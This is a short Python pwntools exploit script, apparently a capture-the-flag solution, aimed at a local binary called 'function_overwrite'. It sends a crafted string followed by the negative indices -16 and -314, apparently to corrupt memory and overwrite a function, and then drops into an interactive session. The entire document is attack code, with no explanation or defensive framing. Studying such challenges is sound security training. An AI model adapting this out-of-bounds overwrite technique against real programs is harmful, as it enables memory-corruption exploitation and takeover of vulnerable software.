#!/usr/bin/python3

from pwn import *

exe = ELF("./function_overwrite", checksec=False)
def slog(name, addr): 
    return success(': '.join([name, hex(addr)]))

r = process(exe.path)
payload = b'aaaaaaaaaaaaaL'

input()
r.sendlineafter(b'1337 >> ', payload)

r.sendlineafter(b'Keep the first one less than 10.\n', b'-16')
r.sendline(str(-314).encode())


r.interactive()